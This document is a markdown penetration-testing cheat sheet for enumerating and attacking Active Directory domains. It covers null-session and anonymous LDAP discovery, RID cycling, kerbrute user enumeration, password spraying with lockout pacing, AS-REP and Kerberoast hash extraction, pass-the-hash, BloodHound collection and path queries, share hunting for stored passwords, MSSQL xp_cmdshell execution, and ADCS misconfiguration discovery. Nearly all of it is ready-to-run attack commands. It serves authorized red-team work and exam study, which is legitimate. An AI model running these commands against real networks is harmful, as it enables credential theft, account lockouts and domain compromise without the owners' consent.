# AD - Enumeration

## Table of Contents
- [Minimum Viable Enumeration Order](#minimum-viable-enumeration-order)
- [Host and Service Discovery](#host-and-service-discovery)
- [Unauthenticated: Null and Anonymous SMB](#unauthenticated-null-and-anonymous-smb)
- [Unauthenticated: Anonymous LDAP Bind](#unauthenticated-anonymous-ldap-bind)
- [Unauthenticated: RID Cycling](#unauthenticated-rid-cycling)
- [Unauthenticated: Kerbrute User Enumeration](#unauthenticated-kerbrute-user-enumeration)
- [Unauthenticated: DNS and SRV Records](#unauthenticated-dns-and-srv-records)
- [ADIDNS Zone Dumping](#adidns-zone-dumping)
- [Username Generation and Password Spraying](#username-generation-and-password-spraying)
- [Authenticated: NetExec Sweep](#authenticated-netexec-sweep)
- [Authenticated: LDAP Queries](#authenticated-ldap-queries)
- [Users, Groups, Computers](#users-groups-computers)
- [Password Policy and PSOs](#password-policy-and-psos)
- [AS-REP-able and Kerberoastable Discovery](#as-rep-able-and-kerberoastable-discovery)
- [Delegation Discovery](#delegation-discovery)
- [LAPS and gMSA Readability](#laps-and-gmsa-readability)
- [MachineAccountQuota](#machineaccountquota)
- [GPO and OU Enumeration](#gpo-and-ou-enumeration)
- [ACL and DACL Enumeration](#acl-and-dacl-enumeration)
- [Domain and Forest Trusts](#domain-and-forest-trusts)
- [BloodHound Collection](#bloodhound-collection)
- [BloodHound Cypher Queries](#bloodhound-cypher-queries)
- [Share Hunting](#share-hunting)
- [MSSQL Discovery](#mssql-discovery)
- [ADCS Discovery](#adcs-discovery)

For Kerberos ticket attacks see [kerberos.md](kerberos.md). For dumping secrets once you have a foothold see [credential-access.md](credential-access.md). For installing every tool referenced here see [tooling.md](tooling.md).

---

## Minimum Viable Enumeration Order

Run in this order. Each step feeds the next.

```bash
DC=10.10.10.10; DOMAIN=corp.local; DCFQDN=dc01.corp.local
# 0. Fix name resolution first - Kerberos and LDAP both break without it
echo "$DC $DCFQDN $DOMAIN" | sudo tee -a /etc/hosts
sudo ntpdate -u $DC          # or: sudo rdate -n $DC / timedatectl set-ntp off; sudo chronyc -a makestep

# 1. What is the domain actually called + is signing enforced?
nxc smb $DC

# 2. Anonymous surface
nxc smb $DC -u '' -p '' --shares
nxc smb $DC -u 'guest' -p '' --shares
nxc ldap $DC -u '' -p '' --users

# 3. Build a user list (RID brute > LDAP > kerbrute > OSINT)
nxc smb $DC -u 'guest' -p '' --rid-brute 10000

# 4. Pre-auth-disabled accounts (no creds needed)
GetNPUsers.py $DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.hash -dc-ip $DC

# 5. Spray (respect lockout policy - check it first if you can read it)
nxc smb $DC -u users.txt -p 'Welcome1!' --continue-on-success

# 6. With ANY valid credential: BloodHound immediately
bloodhound-ce-python -u user -p 'pass' -d $DOMAIN -dc $DCFQDN -ns $DC -c All --zip

# 7. Then: kerberoast, shares, ADCS, delegation, password policy
GetUserSPNs.py $DOMAIN/user:'pass' -dc-ip $DC -request -outputfile kerb.hash
certipy find -u user@$DOMAIN -p 'pass' -dc-ip $DC -vulnerable -stdout
nxc smb $DC -u user -p 'pass' -M spider_plus
```

## Host and Service Discovery

```bash
# Find DCs and AD services on a flat subnet
nxc smb 10.10.10.0/24
nmap -Pn -n -sS -p 88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.10.10.0/24 -oA ad-sweep
nmap -Pn -sV -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='corp.local' $DC

# Identify the DC / forest from any single host
nxc smb $DC          # prints name:DC01 domain:corp.local signing:True SMBv1:False
enum4linux-ng -A $DC
```

`signing:False` on SMB is the green light for NTLM relay. `SMBv1:True` flags legacy boxes.

## Unauthenticated: Null and Anonymous SMB

Null session = empty user + empty password. Guest = `guest` with empty password (still enabled by default on many member servers).

```bash
nxc smb $DC -u '' -p '' --shares --users --groups --pass-pol
nxc smb $DC -u 'guest' -p '' --shares
nxc smb $DC -u 'a' -p ''            # some hosts accept any user with a null password

smbclient -L //$DC -N
smbclient -N //$DC/SYSVOL
smbmap -H $DC -u null -p ''
smbmap -H $DC -u guest -p '' -R --depth 5

rpcclient -U "" -N $DC
# inside rpcclient:
#   srvinfo
#   enumdomains / enumdomusers / enumdomgroups
#   querydominfo
#   querydispinfo
#   getdompwinfo
#   lsaquery
#   lookupnames administrator
```

## Unauthenticated: Anonymous LDAP Bind

Anonymous bind is disabled by default on modern DCs but the RootDSE is always readable.

```bash
# RootDSE - always works, gives naming contexts, functional level, DC name
ldapsearch -x -H ldap://$DC -s base -b '' namingContexts defaultNamingContext \
  dnsHostName domainFunctionality forestFunctionality supportedSASLMechanisms

# Full anonymous bind attempt
ldapsearch -x -H ldap://$DC -b 'DC=corp,DC=local' '(objectClass=*)'
ldapsearch -x -H ldap://$DC -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName description

nxc ldap $DC -u '' -p '' --users
nxc ldap $DC -u '' -p '' --password-not-required
windapsearch -d corp.local --dc-ip $DC -U          # anonymous user dump
ldapdomaindump -u '' -p '' ldap://$DC -o ldapdump/
```

Descriptions on user objects are the single highest-yield anonymous field — passwords get parked there constantly.

## Unauthenticated: RID Cycling

Enumerate SIDs sequentially from the domain SID to recover names without a user list. Needs a null or guest session with at least SAMR/LSARPC access.

```bash
nxc smb $DC -u 'guest' -p '' --rid-brute 20000
nxc smb $DC -u '' -p '' --rid-brute 10000

lookupsid.py corp.local/guest:''@$DC 20000
lookupsid.py 'corp.local/user:pass'@$DC 20000        # authenticated variant

impacket-samrdump corp.local/guest:''@$DC
enum4linux-ng -R -A $DC

# Clean list of usernames from nxc output
nxc smb $DC -u guest -p '' --rid-brute 20000 | grep SidTypeUser | awk -F'\\\\' '{print $2}' | awk '{print $1}' | sort -u > users.txt
```

## Unauthenticated: Kerbrute User Enumeration

Kerberos pre-auth returns a distinct error for valid-but-wrong-password (`KDC_ERR_PREAUTH_REQUIRED`) vs unknown user (`KDC_ERR_C_PRINCIPAL_UNKNOWN`). No logon failure event (4625) is generated by enumeration alone.

```bash
kerbrute userenum --dc $DC -d corp.local -t 50 users.txt
kerbrute userenum --dc $DC -d corp.local /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -o valid.txt

# Impacket equivalent - also dumps AS-REP hashes for pre-auth-disabled accounts in one pass
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash -dc-ip $DC

# nxc
nxc ldap $DC -u users.txt -p '' -k
```

Windows:
```powershell
.\Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:corp.local /outfile:out.txt
```

## Unauthenticated: DNS and SRV Records

```bash
# Locate DCs, GC, KDC via SRV records
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local $DC
dig @$DC -t SRV _ldap._tcp.dc._msdcs.corp.local
dig @$DC -t SRV _kerberos._tcp.corp.local
dig @$DC -t SRV _gc._tcp.corp.local
dig @$DC -t SRV _kpasswd._tcp.corp.local

# Zone transfer (rarely allowed, always try)
dig @$DC corp.local axfr
dig @$DC _msdcs.corp.local axfr

# Reverse + brute
dnsrecon -d corp.local -n $DC -a
dnsrecon -d corp.local -n $DC -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt
```

## ADIDNS Zone Dumping

AD-integrated DNS zones are stored in LDAP and readable by any authenticated domain user. Records whose ACL denies read still expose their *name* — `-r` resolves those by querying DNS directly.

```bash
adidnsdump -u 'corp.local\user' -p 'pass' $DC
adidnsdump -u 'corp.local\user' -p 'pass' -r $DC          # resolve hidden/unreadable records
adidnsdump -u 'corp.local\user' -p 'pass' --dns-tcp -r $DC
# output: records.csv in cwd

# Zone list only
adidnsdump -u 'corp.local\user' -p 'pass' $DC --print-zones
```

Windows:
```powershell
Get-DnsServerZone -ComputerName dc01
Get-DnsServerResourceRecord -ZoneName corp.local -ComputerName dc01
```

## Username Generation and Password Spraying

```bash
# Build permutations from firstname/lastname pairs (OSINT, LinkedIn, ldapsearch output)
username-anarchy -i names.txt -f first.last,flast,f.last,firstl > users.txt

# Spray - ALWAYS check lockout threshold first
nxc smb $DC -u users.txt -p 'Winter2025!' --continue-on-success
nxc smb $DC -u users.txt -p passwords.txt --continue-on-success --no-bruteforce   # 1:1 pairing
kerbrute passwordspray --dc $DC -d corp.local users.txt 'Welcome1'
kerbrute bruteuser --dc $DC -d corp.local passwords.txt jsmith

# Password = username check
nxc smb $DC -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

`[+] corp.local\user:pass (Pwn3d!)` in nxc output means local admin on that host.

## Authenticated: NetExec Sweep

One credential, every protocol. Run all of these against the whole subnet.

```bash
U=jsmith; P='Passw0rd!'; D=corp.local
nxc smb 10.10.10.0/24 -u $U -p "$P" -d $D                      # find where you are admin
nxc smb 10.10.10.0/24 -u $U -p "$P" -d $D --shares
nxc smb 10.10.10.0/24 -u $U -p "$P" -d $D --sessions --loggedon-users
nxc smb $DC -u $U -p "$P" -d $D --users --groups --pass-pol --rid-brute
nxc smb $DC -u $U -p "$P" -d $D --local-groups 'Administrators'
nxc winrm 10.10.10.0/24 -u $U -p "$P" -d $D
nxc mssql 10.10.10.0/24 -u $U -p "$P" -d $D
nxc rdp 10.10.10.0/24 -u $U -p "$P" -d $D
nxc ldap $DC -u $U -p "$P" -d $D --users --groups --password-not-required --admin-count
nxc ldap $DC -u $U -p "$P" -d $D --asreproast asrep.hash --kerberoasting kerb.hash
nxc ldap $DC -u $U -p "$P" -d $D --trusted-for-delegation --gmsa
nxc ldap $DC -u $U -p "$P" -d $D -M maq -M laps -M enum_trusts -M adcs

# NT hash instead of password (pass-the-hash) - LM:NT or bare NT
nxc smb 10.10.10.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
# Kerberos ticket
export KRB5CCNAME=/tmp/user.ccache
nxc smb $DCFQDN --use-kcache
```

## Authenticated: LDAP Queries

```bash
B='DC=corp,DC=local'; H="ldap://$DC"
LDAP="ldapsearch -x -H $H -D 'jsmith@corp.local' -w 'Passw0rd!' -b $B -E pr=1000/noprompt"

# All enabled users
ldapsearch -x -H $H -D 'jsmith@corp.local' -w 'Passw0rd!' -b $B \
  '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
  sAMAccountName description memberOf lastLogon pwdLastSet

# Kerberoastable
ldapsearch ... '(&(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))' sAMAccountName servicePrincipalName

# AS-REP roastable (DONT_REQ_PREAUTH = 0x400000)
ldapsearch ... '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName

# PASSWD_NOTREQD (0x20)
ldapsearch ... '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))' sAMAccountName

# Password never expires (0x10000)
ldapsearch ... '(userAccountControl:1.2.840.113556.1.4.803:=65536)' sAMAccountName

# Unconstrained delegation (0x80000) - excludes DCs by also filtering primaryGroupID
ldapsearch ... '(userAccountControl:1.2.840.113556.1.4.803:=524288)' sAMAccountName dNSHostName

# Constrained delegation
ldapsearch ... '(msDS-AllowedToDelegateTo=*)' sAMAccountName msDS-AllowedToDelegateTo

# RBCD configured
ldapsearch ... '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' sAMAccountName

# adminCount=1 (protected / historically privileged)
ldapsearch ... '(adminCount=1)' sAMAccountName memberOf

# Anything with a password-ish string in the description
ldapsearch ... '(description=*)' sAMAccountName description | grep -i -B2 'pass\|pwd\|cred'
```

Bit-mask operator reference: `:1.2.840.113556.1.4.803:` = AND (bit set), `:1.2.840.113556.1.4.804:` = OR, `:1.2.840.113556.1.4.1941:` = recursive group membership (`LDAP_MATCHING_RULE_IN_CHAIN`).

```bash
# Recursive: every member of Domain Admins including nested groups
ldapsearch ... '(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=corp,DC=local)' sAMAccountName
```

## Users, Groups, Computers

```bash
GetADUsers.py -all corp.local/jsmith:'Passw0rd!' -dc-ip $DC
GetADComputers.py -all corp.local/jsmith:'Passw0rd!' -dc-ip $DC          # newer impacket
ldapdomaindump -u 'corp.local\jsmith' -p 'Passw0rd!' ldap://$DC -o dump/ # HTML+JSON+grep-able
windapsearch -d corp.local --dc-ip $DC -u jsmith -p 'Passw0rd!' -U -G -C --da --privileged-users

bloodyAD -d corp.local -u jsmith -p 'Passw0rd!' --host $DC get children
bloodyAD -d corp.local -u jsmith -p 'Passw0rd!' --host $DC get object 'jsmith' --resolve-sd
bloodyAD -d corp.local -u jsmith -p 'Passw0rd!' --host $DC get membership 'Domain Admins'
```

Windows (PowerView / PowerSploit dev branch):
```powershell
Import-Module .\PowerView.ps1
Get-Domain; Get-DomainController; Get-DomainSID
Get-DomainUser -Properties samaccountname,description,pwdlastset,lastlogon
Get-DomainUser -AdminCount
Get-DomainGroup -AdminCount
Get-DomainGroupMember -Identity 'Domain Admins' -Recurse
Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp
Get-DomainComputer -Unconstrained
Get-NetSession -ComputerName srv01
Get-NetLoggedon -ComputerName srv01
Find-DomainUserLocation -UserGroupIdentity 'Domain Admins'
Find-LocalAdminAccess
```

Native, no tooling drop:
```powershell
Get-ADUser -Filter * -Properties * | Select SamAccountName,Description,ServicePrincipalName
Get-ADGroupMember 'Domain Admins' -Recursive
Get-ADComputer -Filter * -Properties OperatingSystem,DNSHostName
net user /domain; net group "Domain Admins" /domain; net accounts /domain
setspn -T corp.local -Q */*
dsquery user -limit 0
```

## Password Policy and PSOs

```bash
nxc smb $DC -u $U -p "$P" --pass-pol
nxc ldap $DC -u $U -p "$P" -M pso              # Fine-Grained Password Policies
enum4linux-ng -P $DC
ldapsearch -x -H $H -D "$U@corp.local" -w "$P" -b "CN=Password Settings Container,CN=System,$B" \
  '(objectClass=msDS-PasswordSettings)' msDS-PasswordSettingsPrecedence msDS-LockoutThreshold \
  msDS-MinimumPasswordLength msDS-PSOAppliesTo
```

```powershell
net accounts /domain
Get-ADDefaultDomainPasswordPolicy
Get-ADFineGrainedPasswordPolicy -Filter *
Get-DomainPolicy | Select -ExpandProperty SystemAccess
```

Lockout threshold `0` = spray freely. Otherwise stay at `threshold - 2` attempts per observation window.

## AS-REP-able and Kerberoastable Discovery

```bash
# AS-REP (no creds needed if you have a user list)
GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash -dc-ip $DC
GetNPUsers.py corp.local/jsmith:'Passw0rd!' -request -format hashcat -outputfile asrep.hash -dc-ip $DC
nxc ldap $DC -u $U -p "$P" --asreproast asrep.hash

# Kerberoast
GetUserSPNs.py corp.local/jsmith:'Passw0rd!' -dc-ip $DC                      # list only
GetUserSPNs.py corp.local/jsmith:'Passw0rd!' -dc-ip $DC -request -outputfile kerb.hash
GetUserSPNs.py corp.local/jsmith:'Passw0rd!' -dc-ip $DC -request-user sqlsvc
nxc ldap $DC -u $U -p "$P" --kerberoasting kerb.hash
```

Windows:
```powershell
.\Rubeus.exe kerberoast /outfile:kerb.hash /nowrap
.\Rubeus.exe kerberoast /rc4opsec /outfile:kerb.hash      # only accounts without AES enabled
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
Get-DomainUser -PreauthNotRequired
```

## Delegation Discovery

```bash
nxc ldap $DC -u $U -p "$P" --trusted-for-delegation
findDelegation.py corp.local/jsmith:'Passw0rd!' -dc-ip $DC
```

```powershell
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
Get-DomainObject -Properties samaccountname,msds-allowedtoactonbehalfofotheridentity | ? {$_.'msds-allowedtoactonbehalfofotheridentity'}
```

## LAPS and gMSA Readability

```bash
nxc ldap $DC -u $U -p "$P" -M laps           # legacy ms-Mcs-AdmPwd + LAPSv2 msLAPS-EncryptedPassword
nxc smb  $DC -u $U -p "$P" --laps            # authenticate to hosts using retrieved LAPS passwords
nxc ldap $DC -u $U -p "$P" --gmsa
nxc ldap $DC -u $U -p "$P" -M gmsa

python3 gMSADumper.py -u $U -p "$P" -d corp.local -l $DC

# Who is allowed to read what
bloodyAD -d corp.local -u $U -p "$P" --host $DC get search \
  --filter '(ms-Mcs-AdmPwd=*)' --attr ms-Mcs-AdmPwd,sAMAccountName
bloodyAD -d corp.local -u $U -p "$P" --host $DC get object 'SVC_SQL$' --attr msDS-ManagedPassword
```

```powershell
Get-DomainObject -Identity 'srv01$' -Properties ms-Mcs-AdmPwd
Get-LAPSPasswords
Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword
```

## MachineAccountQuota

Default `10` — any domain user can join 10 machine accounts, which is the prerequisite for RBCD and several ADCS paths.

```bash
nxc ldap $DC -u $U -p "$P" -M maq
ldapsearch -x -H $H -D "$U@corp.local" -w "$P" -b "$B" -s base ms-DS-MachineAccountQuota
bloodyAD -d corp.local -u $U -p "$P" --host $DC get object 'DC=corp,DC=local' --attr ms-DS-MachineAccountQuota
```

```powershell
Get-DomainObject -Identity 'DC=corp,DC=local' -Properties ms-DS-MachineAccountQuota
```

## GPO and OU Enumeration

```bash
nxc smb $DC -u $U -p "$P" -M gpp_password -M gpp_autologin
nxc smb $DC -u $U -p "$P" --spider SYSVOL --pattern 'cpassword'
ldapsearch -x -H $H -D "$U@corp.local" -w "$P" -b "CN=Policies,CN=System,$B" \
  '(objectClass=groupPolicyContainer)' displayName gPCFileSysPath
ldapsearch -x -H $H -D "$U@corp.local" -w "$P" -b "$B" '(objectClass=organizationalUnit)' ou gPLink
```

```powershell
Get-DomainGPO -Properties displayname,gpcfilesyspath
Get-DomainGPOLocalGroup                       # GPOs granting local admin
Get-DomainGPOUserLocalGroupMapping -Identity jsmith
Get-DomainOU -Properties name,gplink
Get-NetGPOGroup
gpresult /R /SCOPE COMPUTER
```

## ACL and DACL Enumeration

```bash
nxc ldap $DC -u $U -p "$P" -M daclread -o TARGET=Administrator ACTION=read
dacledit.py -action read -principal jsmith -target 'Domain Admins' \
  -dc-ip $DC corp.local/jsmith:'Passw0rd!'
bloodyAD -d corp.local -u $U -p "$P" --host $DC get writable --detail
bloodyAD -d corp.local -u $U -p "$P" --host $DC get object 'Domain Admins' --resolve-sd
```

```powershell
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match 'jsmith'}
Get-DomainObjectAcl -SearchBase 'DC=corp,DC=local' -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|AllExtendedRights'}
```

Rights worth chasing: `GenericAll`, `GenericWrite`, `WriteOwner`, `WriteDACL`, `WriteProperty` on `msDS-AllowedToActOnBehalfOfOtherIdentity` or `servicePrincipalName`, `ForceChangePassword` (`User-Force-Change-Password` extended right), `Self` on group membership, `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` (DCSync).

`bloodyAD get writable --detail` is the fastest single answer to "what can this principal actually change".

## BloodHound Collection

Linux collectors:
```bash
# Legacy BloodHound 4.x JSON
bloodhound-python -u jsmith -p 'Passw0rd!' -d corp.local -dc dc01.corp.local -ns $DC -c All --zip
# BloodHound CE (v6+) JSON schema
bloodhound-ce-python -u jsmith -p 'Passw0rd!' -d corp.local -dc dc01.corp.local -ns $DC -c All --zip

# Common variations
bloodhound-python -u jsmith --hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -d corp.local -ns $DC -c All --zip
bloodhound-python -k -no-pass -d corp.local -dc dc01.corp.local -ns $DC -c All --zip   # Kerberos, needs KRB5CCNAME
bloodhound-python -u jsmith -p 'Passw0rd!' -d corp.local -ns $DC -c DCOnly --zip       # quiet: no host touching
bloodhound-python -u jsmith -p 'Passw0rd!' -d corp.local -ns $DC -c All --dns-tcp --zip

# RustHound-CE - faster, single static binary
rusthound-ce -d corp.local -u jsmith@corp.local -p 'Passw0rd!' -i $DC -c All -z

# Via netexec (drops JSON in ~/.nxc/logs/)
nxc ldap $DC -u $U -p "$P" --bloodhound --collection All --dns-server $DC
```

`-c` methods: `Default`, `All`, `DCOnly`, `Group`, `LocalAdmin`, `RDP`, `DCOM`, `PSRemote`, `Session`, `LoggedOn`, `Trusts`, `ACL`, `Container`, `ObjectProps`, `SPNTargets`, `CARegistry`, `DCRegistry`, `CertServices`.

Windows collector:
```powershell
.\SharpHound.exe -c All --zipfilename corp.zip --outputdirectory C:\Windows\Temp
.\SharpHound.exe -c DCOnly --zipfilename dconly.zip
.\SharpHound.exe --stealth -c All                          # no SMB/host connections beyond one-per-host
.\SharpHound.exe -c Session,LoggedOn --loop --loopduration 02:00:00 --loopinterval 00:05:00
.\SharpHound.exe -c All -d corp.local --domaincontroller dc01.corp.local --ldapusername jsmith --ldappassword 'Passw0rd!'
.\SharpHound.exe -c All --excludedcs                       # avoid touching DCs

# PowerShell collector
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -ZipFileName corp.zip
```

CE vs legacy: BloodHound CE ships its own collector version (SharpHound v2 / `bloodhound-ce-python` / `rusthound-ce`) and a different JSON schema. **Legacy 4.x zips will not import into CE and vice-versa.** CE uses a web UI on `:8080` with a REST API; legacy uses the Electron app against Neo4j `bolt://127.0.0.1:7687`. Edge names also changed (`ADCSESC*` edges only exist in CE).

## BloodHound Cypher Queries

```cypher
// Shortest path to Domain Admins from owned
MATCH p=shortestPath((n)-[*1..]->(g:Group)) WHERE g.name STARTS WITH "DOMAIN ADMINS@" AND n.owned=true RETURN p

// Everything an owned principal can reach
MATCH p=shortestPath((n {owned:true})-[*1..]->(m)) RETURN p

// Kerberoastable users with a path to DA
MATCH (u:User {hasspn:true}) MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

// AS-REP roastable
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

// Unconstrained delegation (excluding DCs)
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

// Computers where Domain Users are local admin
MATCH p=(g:Group)-[:AdminTo]->(c:Computer) WHERE g.name STARTS WITH "DOMAIN USERS@" RETURN p

// Who can read LAPS
MATCH p=(n)-[:ReadLAPSPassword]->(c:Computer) RETURN p

// Who can read GMSA passwords
MATCH p=(n)-[:ReadGMSAPassword]->(u:User) RETURN p

// DCSync-capable principals
MATCH p=(n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN p

// Sessions of high-value users
MATCH p=(c:Computer)-[:HasSession]->(u:User) WHERE u.admincount=true RETURN p

// ADCS escalation paths (CE only)
MATCH p=()-[:ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC6a|ADCSESC6b|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13]->() RETURN p

// Mark owned in bulk
MATCH (u:User) WHERE u.name IN ["JSMITH@CORP.LOCAL","SVC_SQL@CORP.LOCAL"] SET u.owned=true RETURN u.name
```

## Share Hunting

```bash
# Enumerate readable/writable shares across the estate
nxc smb 10.10.10.0/24 -u $U -p "$P" --shares
nxc smb 10.10.10.0/24 -u $U -p "$P" --shares --filter-shares READ WRITE

# Recursive file listing + auto-download of interesting extensions
nxc smb 10.10.10.0/24 -u $U -p "$P" -M spider_plus
nxc smb 10.10.10.0/24 -u $U -p "$P" -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=5000000
# results: /tmp/nxc_hosted/nxc_spider_plus/<ip>.json

# Targeted content search
nxc smb $DC -u $U -p "$P" --spider SYSVOL --content --pattern 'password' 'cpassword' 'net use'
nxc smb srv01 -u $U -p "$P" --spider 'Departments' --regex '(?i)(passw|secret|api[_-]?key)'

manspider 10.10.10.0/24 -u $U -p "$P" -c 'password' --extensions txt xml ini config ps1
smbmap -H srv01 -u $U -p "$P" -R --depth 10 -A '.*\.(kdbx|ps1|config|xml)'
smbclient //srv01/Share -U "corp.local/$U%$P" -c 'recurse ON; prompt OFF; mget *'
```

Windows:
```powershell
.\Snaffler.exe -s -o snaffler.log                # -s = stdout, auto-discovers domain shares
.\Snaffler.exe -s -d corp.local -o snaffler.log -v data
Invoke-ShareFinder -CheckShareAccess
Find-InterestingDomainShareFile -Include *pass*,*.kdbx,*cred*
Get-DomainFileServer
```

Always read `\\<dc>\SYSVOL\<domain>\scripts\` and `\\<dc>\SYSVOL\<domain>\Policies\` in full — logon scripts and GPP XML are the classic finds.

## MSSQL Discovery

```bash
nxc mssql 10.10.10.0/24 -u $U -p "$P" -d corp.local
nxc mssql srv01 -u $U -p "$P" -d corp.local -q "SELECT @@version"
nxc mssql srv01 -u sa -p 'sa' --local-auth -q "SELECT name FROM master.dbo.sysdatabases"
nxc mssql srv01 -u $U -p "$P" -M mssql_priv                  # impersonation / sysadmin check
nxc mssql srv01 -u $U -p "$P" -x 'whoami'                    # xp_cmdshell

mssqlclient.py corp.local/jsmith:'Passw0rd!'@srv01 -windows-auth
mssqlclient.py 'sa:Passw0rd!'@srv01
# inside mssqlclient:
#   enum_links / enum_impersonate / enum_db / enum_logins
#   use_link SRV02
#   enable_xp_cmdshell ; xp_cmdshell whoami

# Find SPNs registered for MSSQL - reveals every instance in the domain
GetUserSPNs.py corp.local/jsmith:'Passw0rd!' -dc-ip $DC | grep -i mssql
setspn -T corp.local -Q MSSQLSvc/*
```

## ADCS Discovery

```bash
certipy find -u jsmith@corp.local -p 'Passw0rd!' -dc-ip $DC -stdout
certipy find -u jsmith@corp.local -p 'Passw0rd!' -dc-ip $DC -vulnerable -stdout
certipy find -u jsmith@corp.local -p 'Passw0rd!' -dc-ip $DC -vulnerable -enabled -hide-admins -stdout
certipy find -u jsmith@corp.local -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip $DC -json -output corp
certipy find -u jsmith@corp.local -p 'Passw0rd!' -dc-ip $DC -bloodhound      # CE-importable zip

nxc ldap $DC -u $U -p "$P" -M adcs                            # list CAs and their hostnames
# Locate the enrollment service in LDAP directly
ldapsearch -x -H $H -D "$U@corp.local" -w "$P" \
  -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,$B" \
  '(objectClass=pKIEnrollmentService)' cn dNSHostName certificateTemplates
```

Windows:
```powershell
.\Certify.exe cas
.\Certify.exe find
.\Certify.exe find /vulnerable
.\Certify.exe find /vulnerable /currentuser
certutil -TCAInfo
certutil -config - -ping
```

Escalation names to look for in `certipy find -vulnerable` output: `ESC1` (client-authentication template with `ENROLLEE_SUPPLIES_SUBJECT`), `ESC2` (Any Purpose EKU), `ESC3` (Enrollment Agent), `ESC4` (writable template ACL), `ESC6` (`EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA), `ESC7` (`ManageCA`/`ManageCertificates`), `ESC8` (web enrollment + NTLM relay), `ESC9`/`ESC10` (`szOID_NTDS_CA_SECURITY_EXT` / StrongCertificateBindingEnforcement weaknesses), `ESC11` (RPC enrollment relay), `ESC13` (issuance-policy-linked group), `ESC15` (Schema V1 application-policy injection).

## Lockout-safe pacing for kerbrute (--safe and --delay)

**Trigger:** You are about to run kerbrute passwordspray or a long userenum against a production DC and either you could not read the lockout policy, or the policy has a low threshold and a short observation window.

kerbrute defaults to 10 threads with no pacing, which on a spray is how you lock out a department. `--safe` makes it abort the whole run the moment any account comes back locked out, which is the difference between one locked account and a mass-lockout incident that ends the engagement; use it on every passwordspray and bruteuser run by default. `--delay <ms>` inserts a wait between attempts and, importantly, forces single-threaded operation regardless of `-t`, so it is the knob for staying under an observation window rather than a general slowdown: with a 5-attempt threshold over a 30-minute window, pace so no account is retried inside that window rather than pacing the run as a whole. The two are complementary — `--delay` avoids tripping the counter, `--safe` catches the case where someone else already tripped it or your account list contains a pre-locked user. Note the asymmetry the pack already documents: userenum never increments badPwdCount so it only needs `--delay` for volume-based detection on 4768 floods, whereas passwordspray does increment it and needs both.

```bash
# spray: abort on first lockout, one request per second, single-threaded
kerbrute passwordspray --dc $DC -d corp.local --safe --delay 1000 users.txt 'Winter2025!'

# userenum: no badPwdCount risk, pace only to flatten the 4768 spike
kerbrute userenum --dc $DC -d corp.local --delay 500 -o valid.txt users.txt
```

Source: https://offsecexams.com/cheatsheets/zero-credential-domain-mapping

